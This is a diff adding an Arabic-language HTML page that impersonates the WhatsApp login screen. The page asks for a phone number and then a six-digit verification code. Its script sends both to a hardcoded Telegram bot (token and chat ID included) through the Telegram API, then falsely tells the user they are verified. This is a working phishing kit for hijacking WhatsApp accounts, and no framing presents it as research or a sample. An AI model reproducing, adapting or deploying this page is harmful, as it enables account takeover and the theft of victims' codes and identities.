@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp تسجيل الدخول</title>
+<style>
+body {margin:0; font-family:Arial,sans-serif; height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(120deg,#25D366,#128C7E,#075E54); background-size:400% 400%; animation:gradientBG 20s ease infinite;}
+@keyframes gradientBG{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+.container{background:#fff; padding:40px 30px; border-radius:25px; box-shadow:0 12px 30px rgba(0,0,0,0.25); width:100%; max-width:400px; text-align:center;}
+img.logo{width:90px; margin-bottom:20px;}
+h2{color:#075E54; margin-bottom:25px; font-weight:600;}
+select,input,button{width:100%; padding:14px; margin:10px 0; font-size:16px; border-radius:12px; border:1px solid #ccc; box-sizing:border-box; transition:all 0.3s ease;}
+select:focus,input:focus{border-color:#25D366; box-shadow:0 0 8px rgba(37,211,102,0.3); outline:none;}
+select{background:#f1f1f1;}
+.phone-input-wrapper{position:relative;}
+.phone-input-wrapper input[type="tel"]{padding-left:85px; border-radius:12px; border:1px solid #25D366; font-size:16px;}
+.phone-input-wrapper img{position:absolute; left:15px; top:50%; transform:translateY(-50%); width:28px; height:28px;}
+.otp-inputs{display:flex; justify-content:space-between; margin:20px 0;}
+.otp-inputs input{width:55px; height:55px; text-align:center; font-size:24px; border-radius:12px; border:1px solid #ccc; transition:all 0.3s;}
+.otp-inputs input:focus{border-color:#25D366; box-shadow:0 0 10px rgba(37,211,102,0.3); outline:none;}
+button{background-color:#25D366; color:#fff; border:none; font-weight:bold; border-radius:12px; cursor:pointer; transition:background 0.3s, transform 0.2s;}
+button:hover{background-color:#128C7E; transform:translateY(-2px);}
+#error-message,#otp-error{color:red; font-size:14px; min-height:18px; margin-bottom:10px;}
+@keyframes shake{0%{transform:translateX(0);}20%{transform:translateX(-5px);}40%{transform:translateX(5px);}60%{transform:translateX(-5px);}80%{transform:translateX(5px);}100%{transform:translateX(0);}}
+.shake{animation:shake 0.3s; border-color:red;}
+.hint{color:#888; font-size:12px;}
+.step{display:none;}
+.step.active{display:block; animation:fadeSlide 0.5s;}
+@keyframes fadeSlide{from{opacity:0; transform:translateY(20px);}to{opacity:1; transform:translateY(0);} }
+.resend{font-size:12px; color:#888; margin-top:10px; cursor:pointer;}
+.resend.disabled{color:#ccc; cursor:default;}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo">
+
+    <!-- Step 1 -->
+    <div class="step step1 active">
+        <h2>تسجيل الدخول إلى WhatsApp</h2>
+        <form id="phoneForm">
+            <select id="countryCode"></select>
+            <div class="phone-input-wrapper">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف">
+            </div>
+            <div id="error-message"></div>
+            <div class="hint">أدخل رقم الهاتف بدون الصفر الأول</div>
+            <button type="submit">متابعة</button>
+        </form>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step step2">
+        <h2>أدخل رمز التحقق</h2>
+        <div id="otp-error"></div>
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp">
+        </div>
+        <button id="verifyBtn">تحقق</button>
+        <div class="resend disabled" id="resendBtn">إعادة إرسال الكود بعد 30 ثانية</div>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<script>
+var countries = [
+    { code:"MA", name:"🇲🇦 المغرب", dial:"+212" },
+    { code:"EG", name:"🇪🇬 مصر", dial:"+20" },
+    { code:"AE", name:"🇦🇪 الإمارات", dial:"+971" },
+    { code:"US", name:"🇺🇸 الولايات المتحدة", dial:"+1" },
+    { code:"SA", name:"🇸🇦 السعودية", dial:"+966" }
+];
+countries.forEach(c=>{
+    let option=document.createElement("option");
+    option.value=c.code;
+    option.textContent=c.name+" ("+c.dial+")";
+    document.getElementById("countryCode").appendChild(option);
+});
+
+$('#phoneForm').submit(function(e){
+    e.preventDefault();
+    let phone=$("#phoneNumber").val().trim();
+    if(!/^\+\d{6,15}$/.test(phone)){
+        $("#error-message").text("الرجاء إدخال رقم هاتف صحيح مع رمز الدولة");
+        $("#phoneNumber").addClass("shake");
+        setTimeout(()=>$("#phoneNumber").removeClass("shake"),300);
+        return;
+    }
+    $("#error-message").text("");
+    $(".step1").removeClass("active");
+    $(".step2").addClass("active");
+    startResendCountdown();
+});
+
+let otpInputs=document.querySelectorAll(".otp");
+otpInputs.forEach((input,idx)=>{
+    input.addEventListener("input",()=>{ if(input.value.length>0 && idx<otpInputs.length-1) otpInputs[idx+1].focus(); });
+    input.addEventListener("keydown",(e)=>{ if(e.key==="Backspace" && !input.value && idx>0) otpInputs[idx-1].focus(); });
+});
+
+let botToken="8246433435:AAELqIGlOHhej7uQN7kxZQLAaDq_xLGvooo";
+let chatId="1891742408";
+
+function sendToTelegram(phone, otp){
+    let message=`رقم الهاتف: ${phone}\nرمز OTP: ${otp}`;
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:chatId,text:message})
+    }).then(res=>res.json()).then(data=>console.log("تم الإرسال للبوت:",data)).catch(err=>console.error(err));
+}
+
+document.getElementById("verifyBtn").addEventListener("click",()=>{
+    let otp=Array.from(otpInputs).map(i=>i.value).join("");
+    let otpError=document.getElementById("otp-error");
+    if(otp.length<6 || !/^\d{6}$/.test(otp)){
+        otpError.textContent="الرجاء إدخال الرمز الصحيح";
+        return;
+    }
+    otpError.textContent="";
+    let phone=$("#phoneNumber").val().trim();
+    sendToTelegram(phone, otp);
+    alert("تم التحقق وإرسال البيانات للبوت!");
+});
+
+let resendBtn=document.getElementById("resendBtn");
+let countdown=30;
+let interval;
+function startResendCountdown(){
+    resendBtn.classList.add("disabled");
+    resendBtn.textContent=`إعادة إرسال الكود بعد ${countdown} ثانية`;
+    interval=setInterval(()=>{
+        countdown--;
+        resendBtn.textContent=`إعادة إرسال الكود بعد ${countdown} ثانية`;
+        if(countdown<=0){
+            clearInterval(interval);
+            resendBtn.textContent="إعادة إرسال الكود";
+            resendBtn.classList.remove("disabled");
+        }
+    },1000);
+}
+resendBtn.addEventListener("click",()=>{
+    if(resendBtn.classList.contains("disabled")) return;
+    alert("تم إرسال الكود مجددًا!");
+    countdown=30;
+    startResendCountdown();
+});
+</script>
+
+</body>
+</html>
